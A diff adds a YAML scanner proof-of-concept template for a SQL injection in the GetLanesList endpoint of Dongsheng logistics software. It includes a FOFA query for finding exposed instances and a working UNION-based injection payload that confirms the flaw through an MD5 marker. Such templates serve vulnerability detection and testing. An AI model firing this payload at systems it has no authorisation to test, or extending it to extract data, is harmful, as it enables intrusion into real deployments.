@@ -1,0 +1,17 @@
+id: poc-yaml-dongshengsoft-getlaneslist-sqli
+info:
+  name: 东胜物流软件 GetLanesList SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: app="东胜物流软件-物流软件"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /MvcShipping/MsCodeAll/GetLanesList?condition=1=1+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--&sort=LANEID
+  expression: status_code == 200 && contains(body,"0x" + t2) && contains(body,"\"Success\"\x3a
+    true") && contains(body,"\"data\":") && contains(body,"\"GID\":") && !contains(body,"<")
+transport: http
